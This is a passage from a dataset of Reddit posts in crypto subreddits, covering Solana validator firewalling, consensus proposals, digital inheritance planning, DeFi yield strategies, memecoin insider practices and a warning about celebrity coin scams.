have been contributing positively based on the criteria mentioned. if a connection doesn't cut it, it would trigger a firewall rule to block the offending ip address for a set period. the urgency to develop and deploy this solution cannot be understated. relying on solana labs or anza for validator improvements might not be the best strategy. their approach, which basically involves beefing up the validator to handle more quic connections, seems like a temporary fix at best. as spammers adapt and intensify their efforts, such measures might soon become ineffective. it's also vital to consider that not all connections are created equal. connections with stakes in the network might be less of a risk, but they can still be exploited for spam. thus, there needs to be a more nuanced firewall strategy that can differentiate based on the nature of the connection. a notable feature of this proposal is the flexibility it offers validators in managing connections. the ability to whitelist certain rpc sources based on their reputability and possibly other identifiers beyond ip addresses is essential. although it's uncertain how feasible identifying remote peers beyond their ip addresses is with quic, any available identifiers should be leveraged to refine firewall rules. **tl;dr:** enhancing solana's network security and performance quickly can be achieved by implementing smart firewall rules for validators. this involves logging detailed transaction information and monitoring quic connections for suspicious activity, then automatically blocking those deemed harmful. this approach is urgent and prioritizes immediate, though not perfect, solutions over waiting for official updates from solana labs or anza, which might not address the underlying issues effectively. validators would also gain the ability to whitelist trusted connections, adding a layer of flexibility to the firewalling process. *this, of course, is just an idea and doesn't mean it will explicitly solve the problem!* # what's next? **we just have to wait.** it has been confirmed by a few devs that there should be the 1.18 update for solana happening on april 15th (or anywhere around then) which could help with some temporary things. you can read about its significance here: [https://github.com/solana-labs/solana/tree/v1.18.0?tab=readme-ov-file](https://github.com/solana-labs/solana/tree/v1.18.0?tab=readme-ov-file) and the further tags on github. let's stop with this solana fud, we need to think more long-term. if you are seriously an investor or care about this ecosystem's future and want it to overthrow ethereum or whatever personal agenda you want to see it accomplished--you need to look more thoroughly at all of the information. get involved in the core development of the ecosystem and see where your skills can specialize in benefiting this chain. developers are what make solana possible and thank god it's all open source. learn more/read about solana's docs: [https://solana.com/docs](https://solana.com/docs) \-- everything you need to know is there.",108,89,0.82,2024-04-08 13:02:55,web3,solana,MrBamboney,True,108.60000000000001

The paradox of distributed consensus.,"every existing cryptocurrency is susceptible to a 51% attack. *every one of them*. the reason is simple: the purpose of a distributed consensus mechanism is to establish the will of the majority. the 51% attack, therefore, is not technically an *attack*. rather, it is a demonstration that the will of the majority cannot be trusted to protect the rights of all. democracies always fail. what we need is a mechanism that behaves like a *republic,* in which all transactions have an inalienable right to be acknowledged. the obstacle is that transactions are not completely self-confirming. a transaction's *eligibility* for confirmation is self-evident, but its actual confirmation requires an arbitrary decision to be made. there are two reasons for this: 1. there may be too many eligible transactions to confirm them all (congestion). 2. two eligible transactions might contradict one another (double-spending). every consensus mechanism has its own way of defining how the selection is made, but in every case, either directly or indirectly, all power is given to the body of users with the greatest total investment in the system, either through work, stake, or nodes. what if there was another way? instead of *requiring* participants to make the selection, what if the mechanism was designed to *protect* participants from the selection? a mechanism that can fairly distribute available resources, prevent double-spending, and preserve transaction finality, all without arbitration, is the name of that game. i proposed a mechanism, which i call lightning ledger, in a [post](https://www.reddit.com/r/cryptotechnology/comments/n7oqph/lightning_ledger_the_simplest_possible_consensus/) last week, to do exactly this. that post is a succinct definition of the mechanism, but here i want to explain and defend it, because i think there is a good chance it can completely revolutionize crypto technology. the driving concept is that when the prioritization of requests is *self-evident*, gossip about those requests becomes *coherent*, and that coherence can be captured and refined into consensus for free by operating within temporal limits. said differently, once a transaction has been acknowledged, there is a specific amount of time after which there is *no chance* that it has not been acknowledged by every other user in the entire network, because of its viral nature. therefore, if the transactions that define a custody chain are separated by at least this much time, there will be consensus about that custody chain. this automatically rules out the possibility of double-spending. observing this, the only remaining obstacle is how to secure consensus on whether this condition of clarity has been violated, and if so, what to do about it. since a violation is the fault of the coin owner, there is no need to arbitrate between the messages - it is good enough to simply destroy the offending coin. however, such a judgment is the sort of thing that would need to be arbitrated, since it is not self-evident. so it appears to be an impasse. but there is a solution: a graded response function in which the coin is marked as worthless for a duration of time. the more serious the violation witnessed, the longer the punishment. if the violation threatens consensus, the punishment is eternity. since there is coherence between how users perceive the timing of events, there will be coherence in these independent judgments. this is how coherence is refined into consensus: because these curses will expire, slight differences between the exact duration are tolerable. the results... **it is invulnerable to spam and congestion.** all valid requests have a value/energy ratio by which they can be sorted, which naturally gives spam-like requests the lowest priority. also, if the priority index of a request is very low, it can be ignored, because it will re-emerge through gossip if it becomes relevant. spam therefore poses no obstacle to the activity of users, nor to the physical capabilities of nodes. **it is invulnerable to double-spending.** all events affecting a coin's chain of custody must be adequately separated in time, or the coin becomes worthless. if two conflicting requests are nearly simultaneous, users will gossip about both of them, and their proximity triggers universal rejection of the coin. if the two conflicting requests are separated by lots of time, there is no problem, because the first request is already secured. **it is invulnerable to transaction reversal.** within seconds of a transaction, the payer could issue a conflicting transaction which would result in the coin being perceived as worthless by the entire network. however, after this window has passed, this is no longer possible. therefore, the payee simply needs to wait a few seconds, and then he can be sure that his payment is safe. **it is invulnerable to byzantine faults, sybil attacks, and 51% attacks.** the system is completely agnostic to the identities and behaviors of participants. the infection protocol causes the correct information to be, by definition, the most infectious, because that which is most infectious is correct. as long as each user has at least one peer connection to the collective of true users, they are fully resistant to attack, because they will receive all the necessary information from that peer. **what about false timestamps?** chronology is *not* established by declared timestamps, it is established by real-time observation. the exact times within that chronology are only formalized by declared dates to prevent long-term drift in perceptions of coin energy. if this formal date is outside the bounds of the observed chronology, the rejection protocol automatically handles this, because observed dates and formal dates are sequential events affecting a chain of custody. **what are the incentives?** the goal of running a node is to maintain an accurate representation of the public ledger, so that you can submit and confirm transactions. naturally, one could charge a small service fee to do these things on behalf of clients. gossip between users is mutually beneficial, as it increases the utility of both parties to hear what is known and to know what is heard. there is no benefit to having more than a few nodes in a few geographic locations, and no benefit for any of them to have physical capabilities beyond what the standard requires. **where do the coins come from?** this mechanism is exclusively applicable to an existing ledger with a fixed supply of coins. but this is not a unique problem. every cryptocurrency is essentially pre-mined, if one considers that the early adopters always have disproportionately little competition in acquiring their share. a captcha-based distribution might work. or an existing blockchain could be cloned. &#x200b; i hope the community will give this idea serious consideration. i am eager to see what an experiment might demonstrate. i'm not an investor or an engineer, just a thinker. thank you for reading.",106,87,0.95,2021-05-15 09:46:14,web3,CryptoTechnology,CoolGamesChad,False,107.9

Digital Will & Last Testament,"right now i use a mix of shamir's secret sharing, an encrypted usb in my safe, google inactive account manager, and other ""life check"" platforms. let's start with samir's secret sharing, a simple way to create & distribute ""keys"" to give to family members. when n of m come together, the passphrase is decrypted. assume you have 3 family members: you might require at least 2 of the 3 keys to come together in order to decrypt a passphrase. that somewhat protects against a family member losing their key or passing with me. on to ""life check"": these services email/text me reminding me to log in every so often or they will email a note i set to be sent to specific individuals. google has this feature for accounts, and it also allows you to set what happens to your data. after the ""life check"" message is sent, my family can decrypt it using samir's shared secret. the result will be a passphrase that can be used to decrypt a dedicated flash drive in my safe. that flash drive holds my will, account credentials, keys, wallet seeds, etc. i also have backups up this drive kept elsewhere outside my home (due to risk of fire, loss, theft, corruption, etc). designing a self maintained approach that is simple, robust, redundant, & secure is not easy - but i think the above is a nice start. regardless, a dedicated distro with the tools to create, manage, and distribute something like this would be incredibly useful. i've been throwing something together on a barebones mx image i've been customizing, but if others share the use case it might be worth a fully customized solution. some thoughts for optional features below. thoughts, comments, & ideas encouraged in the comments. - ability to require the correct answers to a list of questions that only family would know the answers to, for decryption at boot. - set a recorded video to play when booted, as well as a small partition with booting instructions if connected to a powered on mac/pc. - web3 / network integration, allowing owner to submit signed & encrypted amendments from a blockchain? - backup/sync with password managers. - cryptographic trust that will distribute digital assets to each family memeber once initiated. food for thought. could either be designed as a swiss army knife of tools to tailor to the user's needs or using a refined ""best practice"" approach. either way, simplicity (or integrated documentation) is critical. you'd be surprised how difficult it is to get your family onboarded with tails as a secure way to always be able to reach them. but i'd like to think they'd give the time of day to figure out how to boot a usb disk when i die. but maybe chalk up adding the name of a ""trusted tech advisor"" on the boot screen as a possible feature.",59,153,0.92,2022-01-14 20:18:50,web3,CryptoTechnology,TheCoreyMatthews,False,105.8

My DeFi strategy in 2022 - Critique me!,"hello fellow degens (responsible investors). if you are like me you have probably already have closed your savings account with your local bank and diversified fully into crypto. the last 3 months have been turbulent for web3 and international financial, here are my predictions/assumptions about what’s coming in 2022: \- international financial markets, including cryptocurrencies are going to go through a significant contraction as interest rates start to grow up. there will be less money available to borrow and less money to invest – especially in speculative value assets like those in web3. \- imo yield farms are going to get less stable, it just seems like a matter of time. this market is getting pretty saturated, soon there wont be enough liquid capital for these xxx% apy’s. \- the fed is coming. the us has started a handful of inquiries into cryptocurrencies, china already has it banned; at the end of the day legislation is coming, the tax man is coming. they're literally meeting tomorrow to discuss interest rates and i wouldnt be shocked if crypto was on the agenda too. \- usdt….. now for my strategy. i have a “safe” job and a “safe” amount of money invested into traditional stocks and etfs, i mainly use crypto as a high interest savings account. as such, legitimacy and stable growth are my most important aspects. i chose to hitch my wagon to the l1 near, a decision i have absolutely not come to regret. i stake in their pos mechanism on metapool at around 10% apy. boring right? except metapool returns your liquidity after like 2 days while leaving your original value staked. i then take liquidity to ref finnance where i do single-side staking on their token(like 20% apy.) first i believe in near as a layer 1 and i prefer to diversify across a single ecosystem than multiple. this is something i set up and check once a month, i don’t have the time or desire to bounce around bridges and liquidity pools next i realized that ref finance is the only amm dex on the near platform, easiest way in the future for people to exchange tokens between any appchains launching on near. ref will grow linearly with near and automatically diversity across and entire l1. finally i decided that i’m not overleveraged, 30% apy sounds super nice and i won’t be risking il through farming. thoughts on this strategy? i know a lot of you will cringe about lack of diversification, but for me crypto and 30% apy is by far the riskiest part of my portfolio.",97,93,0.92,2022-01-24 17:49:12,web3,defi,Mediocre-Series4505,False,104.60000000000001

"The dirty lie about memecoins, what everyone should understand before they start trading them","despite the fact that you see people making money on memecoins, they are a negative expected value investment for the vast majority of participants. the lie that they tell everyone about memecoins is that ""they are fair launched! no one has any unfair advantage! it's not like a coin with a team behind it where the team owns 25%!"" but the truth is before launch, memecoin creators tell their friends, favorite influencers the coin they are about to deploy and the influencers and friends have already setup bots to snipe or plan to manually buy early on. once this happens, the shilling can commence. this happens with all memecoins. at every level. from bome to wif to boden to harrypotterobamasonicinu10 to the small $10,000 rug pulls. why does this happen? because it's the only way to have an edge in the memecoin game. when you are launching the coin yourself, or you are an influencer who bought on launch because you know the dev, you have a massive advantage over all other participants. your first advantage is that you got in at a much lower price. the second advantage is, you know exactly when the project will stop developing/stop making memes/when influencers will stop tweeting about it. this makes it just about impossible to lose for these people. they are simply printing money by dumping on people who don't realize how easy it is to create a memecoin. none of these things are being fair launched. it's relatively easy to make all of this seem ok on-chain and make it look fair to an outsider. influencers are primarily promoting memecoins as the best investments of this cycle because it is the investment they can make the most money on (since it is extremely small market cap and they can directly influence it). all this being said, if you want to play memecoins, that is ok. just understand how much the deck is stacked against you. average memecoin allocation of coins to insiders vs fair players is actually worse than your average vc backed token. the vc tokens just launch at such high fdv retail can't move it up in value so no one will play ball (rightfully so!). memecoins launch at low values but the deck is stacked against you even more, and people still believe these things are launched fairly so they buy them.",87,98,0.87,2024-05-07 14:33:34,web3,solana,dankvibez,False,100.10000000000001

Repost from r/cc since responses were brutal,"repost: in any blockchain, take bitcoin for example, the previous block's hash is added to the new block. this makes it so that the order of blocks cannot be changed. in other words, it creates an immutable and chronological sequence of events. a ""proof of history,"" if you will... am i missing something, or is this no different from what bitcoin and any other blockchains do with hashes in blocks? after reading deeper into it it seems like the main difference is that instead of having a node find a block and broadcast it to all other nodes who then individually audit the txs in the new block and individually cross-reference each other, solana chooses a ""leader"" validator via pos who finds a block, broadcasts it to all other nodes and then tallies the votes from all the other nodes themselves rather than all nodes cross-referencing each other's votes and determining the majority decision (i.e. broad consensus) it seems like this ""leader"" model where one party counts votes and determines consensus instead of all nodes reviewing all other nodes' votes and determining majority consensus, is what sets it apart and allows for massive throughput and speed. pls correct me if i am off or just way wrong on this. i've been trying to understand exactly what poh is for hours today and outside of the whitepaper, i can't find any decent material that really breaks it down in an honest and simple way. everywhere i see it written about it is described as this massive innovation but it seems to be exactly the process of hashing in sha256 and new blocks having the hash from old blocks. in fact, it sounds like it is literally proof of work just rebranded. also, i hate to get all fuddy, but if i am correct then this system obviously sacrifices vast amounts of decentralization for speed/scalability far beyond arguments commonly seen around crypto subs like hardware requirements, token distribution, etc. someone responded with this [writeup](https://notes.ethereum.org/@dankrad/bjywszy9t), but this is just out of reach of my technical level. i'm basically looking for this but a bit more dumbed down. p.s. i currently hold sol edit: is another key difference that solana creates a hash for each individual tx which then gets stamped on the next incoming tx? rather than just having a whole block of txs have the hash of the previous tx and its own new hash? if so, how does this process specifically save time unless it's like i said above where nodes just send votes to a leader who counts them instead of signaling them to all other nodes and nodes collectively coming to a majority consensus? it seems to just forego a major step there? thanks to anyone willing to help me here..",74,113,0.94,2022-02-04 07:51:58,web3,CryptoTechnology,lwc-wtang12,False,99.0
"Unless I'm mistaken, ZK is pretty much the future of Ethereum scaling and I think it is the future of the blockchain as a whole.","this isn't the ethereum subreddit but it's the crypto technology subreddit and i'm a fan of ethereum personally so i will use it as an example. the man vitalik himself has stated on more than one occasion that ethereum is going to be getting more and more complex. what this means i feel like is that ethereum is always going to need a scaling solution. (polygon, arbitrum, etc) one thing the eth maxis fail to mention is that eth 2.0 won't just magically solve ethereum's technical limitations, sure it might lower gas but people would still rather pay a few cents on polygon than 30$ for a 10$ transaction on ethereum. rollups are a method of scaling ethereum in which transaction execution is moved off-chain, but ethereum ensures the validity of every transaction. in effect, we can deposit funds in a smart contract and interact with those funds on the rollup for a fraction of the cost, with the assurance that our funds are as safe as if we were transacting on ethereum. because rollups rely on ethereum for data availability and transaction validation, this is possible. all data necessary to recover the most recent state of the rollup and add new transactions is posted to ethereum, and transactions are validated using fraud or validity proofs. zk proofs, also known as zk cryptography, are a fascinating field of cryptography that develops protocols and techniques for proving mathematical statements without revealing (most of) the underlying data, often in a very concise manner. although it was conceived in the mid-1980s, it is only with the advent of blockchain that it has found a strong use case, introducing new ways to address some of the industry's most difficult challenges. recently, we've seen a true cambrian explosion of zk protocols and approaches, each with its own set of advantages and potential applications. basically zk is incredibly efficient. they are much more scalable than optimistic rollups. they are also much faster because or's fraud-prevention mechanism necessitates the locking of funds for a dispute period (currently a week for arbitrum and optimism). if an invalid transaction is included in a rollup, anyone can submit a fraud proof and revert it during the dispute period. zk rollups, on the other hand, include a validity proof that cryptographically guarantees that all transactions are valid, eliminating the need for any delays. i think zk is the only way forward for ethereum and it's interesting to see chains like polygon jump the gun and setting themselves up for the future by looking to drop 4 zk solutions this year. i'm very interested to see where this is going to go but i believe we've found the solution to truly creating an incredible web3 as far as the tech is concerned.",88,94,0.86,2022-04-16 09:20:42,web3,CryptoTechnology,-Aporia,False,99.0

Risks in Cryptotechnology,"hopefully this topic is suitable for this sub. really, i'm looking for both original opinions and any pointers to other people thinking about the darkside of crypto tech. to be clear, this is not fud, i'm invested in crypto and really excited by it, but i would love to see the community be a little more skeptical about the utopian claims. i've been listening to lots of podcasts lately on crypto and blockchain and sometimes the guests just sound outright naive. i do worry that this is exactly the same kind of idealism that brought web2.0, which has destabilized the society in a large variety of ways. things like child pornography and money laundering are often discussed in relation to this topic, but here are some things that come to mind of varying degrees of possibility. i'm not saying that i think these things will happen at all, just trying to start a discussion on risk. -loss of control of monetary policy by states has drastic consequences. perhaps something like the great depression and the gold standard is a possibility? perhaps just fiscal stimulus that saved the economy this past year becomes a lot harder? -largest protocols controlled increasingly by whales, power becomes entrenched and a weakened state is increasingly powerless to combat inequality. -the blockchain technology gets co-opted by the state and becomes a powerful tool combined with data analytics to keep control of the citizens (see china) -daos become a new way for individuals to avoid culpability (like corporations, see e.g. the sackler family and purdue pharma) -daos cannot be regulated like corporations, so government protections provided to employees can be skirted (that is economic exploitation that sidesteps say healthcare requirements, minimum wage etc.) so, we've all heard the crytpo-utopianism, but what do you think are some possible downsides to crypto tech? and for bonus points, how might they be dealt with? thanks!

The GameFi Sector and the Most Promising Gaming Platforms,"gaming tokens skyrocketed this summer, becoming one of the most notable happenings in the crypto market. for example, the axs token of the blockchain game axie infinity rose by more than 1500% in three months, breaking into the top 50 assets in terms of capitalization and making it into global financial media. so, what is happening in the blockchain gaming industry, and what can we expect in the future? the ethereum blockchain was mostly employed in the production of games released in 2020 or before. however, because of unreasonably high prices, the developers were forced to switch to cheaper and faster blockchains. many games are built on wax, eos, and tron. beginning in early 2021, binance smart chain is also gaining popularity in the gaming business. there have also been additional developments in terms of the quality of these games. we started with rudimentary games with basic interfaces and visuals. to eventually obtain some tokens, you had to do easy chores such as leveling up your hero or developing your farm or another property.no developers trying to make them more interactive for the real geeks who are used to donating a lot of money to bend the traditional progress and beat the competitors. the developers try to adapt them to our favorites like gta, fallout, cs, or something else. one such game which caught my attention was dustland by rpgc. they develop a 3d adventure-game in a post-apocalyptic world where you get rewarded while soaring through the wasteland and trying to survive. i'm waiting for the demo-launch till the end of february to see how the gamefi can evolve.",99,73,0.94,2022-02-01 05:21:20,web3,defi,psychoticmetre224,False,98.0

"Decentralization of governance, the pros and cons of democracy, and the evolution of block chain technology : A proposal for 4th generation coins.","i have major beef with 3rd gen coins, and their view of governance and democracy, because it really doesn't work to solve the problems it want to solve. &#x200b; 1. some history. 1st gen coins and 2nd gen coins were setup by individuals who then either abandoned the project with rigid rules as dictated by one person, or have been changing the rules as determined by some foundation. at the end of the day, the verification of transactions is decentralized, sure, but actual power remains in the hands of a few elite at the top. this is essentially the idea of a benevolent monarch / cabal running a government or country - and the downsides are not only obvious, but have a long history of not working in the long term. 2. democracy (as seen in 3rd gen coins) is also largely a flawed system though. firstly, it's seriously incompatible with unequal distributions of wealth in a world where the rich can buy media presence and political influence. second, there are inherent flaws like the tyranny of the majority, the fact that many non-experts end up voting on expert topics (ignorance of the voter), and the fickle nature of human's struggle between long term and short term benefits, along with many many more \[democracy isn't a great system, but it might just be the least worst\]. ... so what solutions have people found to the problems of democracy since it's invention back in athens? well... quite a few, but the most popular today is representative democracy. we elect experts to vote on our behalf who can respond quickly and who are knowledgeable on complex political problems. but still... representative democracy is still full of problems! if you elect a single ruler like a president or pm, you still suffer from problems like ignorance (no one person can be expert on all subjects), their inability to respond quickly (people can only do one thing at a time), the fact that they are still elected based on media presence and political influence (the wealthy end up in politics), and of course - they can still be elected by a misinformed majority who aren't interested in long-term success (hence the destruction of the climate). conversely, if you elect a group of actors instead of a single president/pm they suffer from grid lock, party politics, and the ability to remain partially anonymous due to the group size which makes corruption much harder to root out. but regardless. 3rd gen crypto never claimed to be a democracy. instead, it's really a kind of timocracy - where only property owners can vote, and normally only those who have some minimum amount of that property. and obviously, it has it's issues - especially when property isn't tied to an individual in the crypto-space but instead a wallet. a wealthy individual could just make 1000 wallets and rig the election in their favor. obviously, this quickly turns into a plutocracy, which clearly has it's own issues and devolves very quickly away from decentralization. so what can you do then? how can crypto solve a problem that has evaded political scientists for millennia? well, it can't. but it also doesn't have to. see, crypto isn't about governing an entire country. it's about governing a small subset of monetary policies which effect currency production and use. and it has one major advantage i think is worth profiting from - it can support sharding and fractured experiments. **so here's what i propose** : organic evolution of block chain rules based on positive reinforcement from miners and users. essentially, each week, a new ""strain"" of the blockchain is produced which has slightly different rules, transaction fees, rewards for solving, changes to the maximum supply, etc... and the miners / stakers then choose which strain they want to support/mine/stake. then, when someone (the consumer) wants to xfer the coin, they scroll through a list of ""weekly top"" and ""favorite"" strains and use that particular set of rules for their transaction -- assuming of course that there's enough miners to support that strain. there is always some number x of active strains you can choose from at a time, but at the end of the week, the least used strain dies off. the result is that over time, miners and users strike a balance between what works for the producers and what works for the consumers. \[edit : for clarity, all strains write to the same shared ledger, but they write to it with different rules. one strain might have moderate fees and change little about the ecosystem, but another strain might be feeless, but mint new coins which are given to the miner. another strain might add native support for some new technology. either way, they all write to the same simultaneous ledger\]. the goal here is to admit and take into account that miners and users have different needs and desires, and to limit the power of each such that only a compromise is possible, but so that people still have some choice as to which compromise they want to accept. moreover, it can adapt over time as demands change, as new rules or ideas are proposed, and it can respond without command from above. governance is made according to the people who use it, and they have their choice in governance. at the end of the day, this is very similar to free market governance settling on an optimal supply/demand curve. and that's what markets do best, after all. it happens without the need for governance, without the need for a foundation or a strict set of rules, it can change quickly and adapt to market fluctuations in real time, and yet there's no one ""in charge"". to some extent, this is already part of what the crypto market is doing itself, as new cryptocurrencies show up and die off regularly. so why bother with a new coin / project / generation of coins then? because normalizing this into one consistent coin provides stability. your coin with it's particular set of rules can die off, without ever really dying off. currency immortality which avoids governance and the problems of both a founder/foundation and the problem of democracy. no need for bitcoin and litecoin to compete. in this kind of ecosystem, they're just two strains of the exact same coin, and if the market ever shifts away from btc to ltc, you still keep your coin. nothing lost, even if that strain dies. **tl;dr :** have a closed system made of some fixed number of ""strains"" of the same cryptocurrency (but with different rules governing each strain) that users and miners can choose to support and use whenever they want. each week, you add a new strain, and kill the least supported one, but have it all run on the same ledger so that even if the strain you were using dies, nothing is gained or lost on your end. interoperable and exprimental evolution of the rules of the currency. basically, the blockchain rules will eventually evolve into an optimum set of rules that balances the needs of the producer and consumer, while still maintaining some degree of choice for both.",51,146,0.89,2022-01-13 08:17:06,web3,CryptoTechnology,[deleted],False,97.9

Verifiable Computing Applications in Blockchain,"hi, we have recently published a paper [verifiable computing applications in blockchain](https://ieeexplore.ieee.org/document/9620108) and i am sharing it here since i think some of you might find it interesting. in the paper we provide an overview of common methods for verifying computation, such as replication (recomputation), proofs (interactive proofs, zero-knowledge proofs such as zk-snarks, bulletproofs, etc.), multiparty computation (mpc), verifiable randomness (vrf/vdf), and trusted execution environment (tee/sgx). we then group the applications of these verifiable computing techniques into five thematic blockchain areas (secure key management, sybil-resistance and consensus, smart contracts, scalability, and privacy) and discuss how are they used in major blockchain projects today (summary/examples in table 3 and table 4). &#x200b; >**abstract** > >from weak clients outsourcing computational tasks to more powerful machines, to distributed blockchain nodes needing to agree on the state of the ledger in the presence of adversarial nodes, there is a growing need to efficiently verify the results of computations delegated to untrusted third parties. verifiable computing is a new and interesting research area that addresses this problem. recently, new applications of verifiable computing techniques have emerged in blockchain technology for secure key management, sybil-resistance and distributed consensus, and smart contracts, while providing desired performance and privacy guarantees. in this paper, we provide an overview of common methods for verifying computation and present how they are applied to blockchain technology. we group the presented verifiable computing applications into five main application areas, i.e., multiparty approval for secure key management, sybil-resistance and consensus, smart contracts and oracles, scalability, and privacy. the main contribution of this survey is to answer two research questions: 1) what are the main application areas of verifiable computing in blockchain technology, and 2) how are verifiable computing techniques used in major blockchain projects today.",52,140,0.97,2021-12-10 15:34:13,web3,CryptoTechnology,ssimunic,False,96.9

Can blockchain realistically be utilized as a mechanism for voting at elections,"now of course it is possible to develop an app that could accomplish this however this is not only a matter of technology but of politics and society. developing an app is actually the least of the problems, there has already been applications of utilizing blockchain to verify election results (although not through apps that users had on their devices, apps would be probably easier ) and this happened in sierra leona although not on its entire territory, it is an entirely different ordeal to organize something like this in the country that is as populous as the usa. also doing this through a voting app would be the most practical however would require everyone to have a mobile phone, and infrastructure to make such a thing a possibility, so this would for the time being brle limited only to the most advanced nations in the world. there would also have to be a universal digital id and although a lot of companies like, giant, world mobile token, ledger and even microsoft are focusing their efforts on creating digital id a lot of work still has to be done. there has been blockchain application in all spheres of commerce and industry and tech from telecommunications to sustainable energy to space tech however these are mostly private companies that if fail, fail for themselves, their failure doesn't have nation wide implications, any possible failure or breach of such a system can have catastrophic consequences for any country even the most stable ones. we also need to take in consideration that the people who don't have sufficient knowledge of what blockchain is could claim that somehow the elections are illegitimate, that they were stolen, that they were 'hacked' etc and although this would be without merit as far as the truth is concerned this could also lead to serious implications protests unrests and soon, just remember the last election and mailed votes. my opinion is although the tech is mature enough (almost) to be implemented, social implications must also be considered and that for those reasons some time will have to pass before this is a reality.",104,59,0.99,2022-06-05 18:00:39,web3,CryptoTechnology,Burdrgts,False,95.9

"Warning: Be careful with recent ""celeb coins"" (Caitlyn Jenner, Sahil insiders/scams)","hi, (it is difficult for me to include full proof here since images and links may get the post removed, but i'll try to provide more context/sources/proofs in comments, feel free to ask for specifics too!) i want to urge everyone to be careful about buying the recent coins marketed by celebrities. a person known as sahil/sahilsays who has connections to various celebrities and has previously been involved in rugs/scams (dyor) is reaching out to clueless influencers offering to make them quick money. why the celebrities are agreeing to launch with this person is beyond me, it is incredibly reckless and the celebrities themselves are just as much to blame for what is happening as the scammer facilitating it. the manager of caitlyn jenner claimed on a x/twitter space that they held 3% of $jenner (the coin sahil launched with them) supply, but upon checking holder distribution on-chain there is no holder with this amount. the raydium (liquidity pool) however had roughly 3%. in other words, sahil have managed to convince these people that they have 3% of the 8-figure market cap, while in reality they likely have nothing. sahil, on the other hand, is buying the coin supply with his friends before the token address is confirmed by caitlyn and then dumping it for insane returns when the celebrities announce. sahil is also behind the (original) rich the kid coin, where he bought lots of supply beforehand and sold for a profit, ripping off rich in the process (likely in the same manner as with caitlyn). rich spoke about this in a x/twitter space earlier today (describing how he got scammed by sahil) and announced that he was launching a new, ""real"", coin without sahil, which was just launched a few hours ago at the time of writing. sahil walked away with hundreds of sol in profit from this as well. incredibly, rich did not learn from his mistake whatsoever and some random people were able to convince rich to let them help him launch the new ""real"" token, which had an unfair launch in the exact same manner where these insiders were able to buy up a large portion of the supply before the token address was publicly announced. sahil also has a telegram group called xo where he ""calls"" these projects. a couple hours ago, he announced that the next coin would be with iggy azalea, and that the first 100 wallets to send sol to a pre-sale address would get tokens airdropped for the launch in exactly 24 hours. this limit was exceeded almost instantly and he swiftly announced that he is raising the cap to 700 wallets. the wallet has been sent over 1853 sol at the time of writing. just a few hours after this announcement, he unexpectedly sent a pump fun link for a coin called iggy azalea in his telegram channel. sahil and his friends had of course already bought lots of supply and immediately dumped for multiple hundreds of sol in profit, sending the coin to zero. shamelessly, he then deleted his telegram message and absurdly said ""dont buy spams"" and ""iggy will tweet launch"", acting as if nothing happened. he is just blatantly farming people who are trying to get in on these celebrity launches, and i would not be surprised in the slightest if those ""pre-sale"" funds are never seen again either. apart from sahil, there are of course countless larps who attempt to claim they are tied to a celebrity with every launch, desperately trying to trick just a few people into buying their fake coins on pump fun. please, be very careful buying into these projects. it is a shame that someone so void of integrity, morals or shame has been able to leverage clueless and irresponsible celebrities to exploit users, and this will continue until every victim has been rinsed. this is the exact type of stuff that gives crypto such a negative taint in the public eye, and i encourage you to stay safe and avoid this mess all together. best of luck.",97,69,0.96,2024-05-27 20:49:46,web3,solana,crayblob,False,95.39999999999999

NFTs are much more than art - 3 Better use cases for NFTs than art -what is your favourite use case for NFTs?,"most of the attention in the crypto space is focussed on nfts as art.however, a few amount of people actually know that nfts are much more than a proof ownership of a gif or picture. in the near future nfts are going to solve problems in industries, which consumers face regularly. below are my top 3 favourite use cases for nfts. what is your favourtie use case of nfts beyond art **1. event ticketing** using unique, unforgeable nfts to represent tickets for specific sports and entertainment events helps to prevent scalping and scamming. **smart contracts** can be used to make tickets non-transferable to prevent scalpers from purchasing sought-after tickets in bulk and then reselling them at inflated prices and prevent scammers from trying to sell counterfeit tickets. on a podcast in march, mark cuban, billionaire investor and owner of the dallas mavericks, expressed a great deal of interest in nft technology. “we’re trying to find a good option for turning our tickets into nfts. we want to be able to find ways so that not only can our consumers, our fans, buy tickets and resell them, but we continue to make a royalty on them. **2. the music and video industry** in much the same way **nfts have helped artists discover new ways to create their works and reach new markets**, the tokens are also transforming how musicians create and share their music and videos. the properties of nfts—uniqueness, verifiability, transferability—offer musicians greater independence from labels and other gatekeepers of their industry, better enabling them to self-distribute their work and cultivate direct relationships with fans. musicians can sell tracks as nfts on marketplaces such as opensea, auction previously unpublished material as limited-release nfts, and even sell rights to their works. these tokens can generate fast and significant interest from fans. alternative musician grimes sold digital art and videos as nfts for almost $6 million on **nifty gateway** in 20 minutes earlier this year. **2.** rock band kings of leon recently generated $2 million in nft sales of their new album in just **one week**. nfts have the potential to replace conventional subscription models for “super-fans.” for example, they can be programmed so that the subscribers holding them can access premium music and video content or even highly exclusive benefits, such as lifetime front-row seats to concerts.**3** those same nfts can also be programmed to collect royalties for musicians every time they are **sold and resold**. **3. unique experiences** some industries are using nfts to tokenize historic moments. the sports industry, for example, is capturing such moments using collectible card-style nfts. sports personalities are leading the way by including experiential content in nfts that only owners can “unlock.” an **nft created by american basketball player luka garza** includes the opportunity to meet him, compete with him in a game of horse, and join him for dinner and a movie.",77,99,0.92,2021-11-27 04:24:29,web3,defi,cantileversboxierf9,False,95.0

Maximizing Yield on US Dollar Pegged Coins,"[link to original post](https://jorgevelez.substack.com/p/maximizing-yield-on-us-dollar-pegged) in this post i want to illustrate how to use several defi applications to maximize yield on us dollar pegged coins (stablecoins) without having exposure to cryptocurrencies volatility. the first step is to get the amount you want earning yield in your metamask wallet. from there, open the matic network wallet and transfer the eth to the polygon / matic network the next step is to connect your matic metamask wallet to quickswap, and exchange your eth to dai. dai is a cryptocurrency that is pegged to the us dollar, meaning 1 dai = $1 usd finally, deposit your dai in aave. this is where the fun begins. now that your assets are deposited on aave, the goal is to borrow usdc, another coin pegged to the us dollar. the idea is to do the following: borrow usdc on aave exchange usdc to dai on quickswap deposit dai on aave after repeating steps 1-3 eight times, this was the result: what does this mean? i have deposited on aave $3,382 dai, earning 2.82% p.a on my deposit i have borrowed $2,400 usdc, costing me 2.94% p.a. i am earning 3.71% matic rewards for my dai deposit on aave i am earning 3.46% matic rewards for my usdc loan on aave what are matic rewards? matic is the native token of the polygon / matic network. at the moment, i am being rewarded as an user of the protocol. the rewards accrue instantly, so for the purposes of keeping my cryptocurrency price volatility at a minimum, on an almost daily basis i will be converting my rewards to dai and depositing them in aave. what is my expected annual rate of return on this strategy? for my deposit, i expect to make: $3,382 * 2.82% = $95.37 for my loan, i expect to pay: $2,400 * 2.94% = $70.56 my matic rewards for my deposit are: $3,382 * 3.71% = $125.47 my matic rewards for 